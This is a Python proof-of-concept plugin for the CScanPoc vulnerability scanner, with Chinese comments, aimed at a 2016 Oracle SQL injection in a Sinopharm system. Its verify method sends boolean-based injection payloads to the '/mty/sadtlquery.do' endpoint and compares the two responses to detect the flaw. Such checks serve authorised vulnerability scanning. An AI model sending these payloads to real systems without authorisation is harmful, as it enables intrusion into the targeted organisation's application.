# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Sinopharm_0101'  # 平台漏洞编号
    name = '国药系统Oracle注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-06-22'  # 漏洞公布时间
    desc = '''
    国药系统Oracle注入漏洞，攻击者可以通过构造恶意语句来读取系统敏感文件信息。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=205908
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Sinopharm'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'feb288eb-1d33-441b-9da4-28c2cfc33ac1'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = self.target + "/mty/sadtlquery.do?id=1638174 AND 5173=5173 &supplyid=5355&supplyname=%B0%B2%BB%D5%CA%A1%D2%BD%D2%A9%A3%A8%BC%AF%CD%C5%A3%A9%B9%C9%B7%DD%D3%D0%CF%DE%B9%AB%CB%BE"
            url1 = self.target + "/mty/sadtlquery.do?id=1638174 AND 5173=5172 &supplyid=5355&supplyname=%B0%B2%BB%D5%CA%A1%D2%BD%D2%A9%A3%A8%BC%AF%CD%C5%A3%A9%B9%C9%B7%DD%D3%D0%CF%DE%B9%AB%CB%BE"
            _response = requests.get(url)
            _response1 = requests.get(url1)
            if _response.text != _response1.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
